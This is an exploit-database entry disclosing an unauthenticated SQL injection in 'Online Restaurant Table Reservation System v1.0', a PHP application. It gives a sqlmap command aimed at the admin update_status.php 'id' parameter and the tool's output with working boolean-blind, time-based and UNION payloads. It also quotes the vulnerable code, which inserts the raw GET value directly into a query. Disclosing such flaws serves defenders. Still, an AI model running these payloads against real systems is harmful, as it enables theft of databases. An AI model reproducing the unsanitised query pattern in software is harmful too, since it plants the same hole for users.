@@ -1,0 +1,53 @@
+id: 37657
+date: 04/21/2022
+title: Online Restaurant Table Reservation System 1.0 SQL Injection Vulnerability
+author: segf0lt
+cves: 
+
+# Exploit Title: Online Restaurant Table Reservation System v1.0
+# Exploit Author: segf0lt
+# Vendor Homepage: https://www.sourcecodester.com/php/15286/online-restaurant-table-reservation-system-phpoop-free-source-code.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/ortrs.zip
+# Tested on: Ubuntu, Apache, Mysql
+# Version: v1.0
+# Exploit Description:
+# Online Restaurant Table Reservation System v1.0 suffers from an unauthenticated SQL Injection Vulnerability allowing remote attackers to dump the SQL database using a union based SQL Injection attack.
+
+
+# Exploit 
+* Exploit with Sqlmap
+
+sqlmap -u "http://localhost/ortrs/admin/reservations/update_status.php?id=12" --dbms=mysql -dbs --risk=3 --level=5
+
+Results:
+
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: id=12' AND 5078=(SELECT (CASE WHEN (5078=5078) THEN 5078 ELSE (SELECT 1275 UNION SELECT 1902) END))-- -
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=12' AND (SELECT 2322 FROM (SELECT(SLEEP(5)))fRlk)-- nYDm
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: id=12' UNION ALL SELECT CONCAT(0x7178786b71,0x4b54627963664a4b6a634354487949726b4c7373676d59656359755274656970427854514f4f5742,0x7178627871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+---
+
+
+# Vulnerable Code
+
+* No filter `id`  when inserting data to database of update_status.php webpage
+
+if(isset($_GET['id']) && $_GET['id'] > 0){
+    $qry = $conn->query("SELECT * from `reservation_list` where id = '{$_GET['id']}' ");
+    if($qry->num_rows > 0){
+        foreach($qry->fetch_assoc() as $k => $v){
+            $$k=$v;
+        }
+    }
+}
+
+#  0day.today [2023-03-23]  #
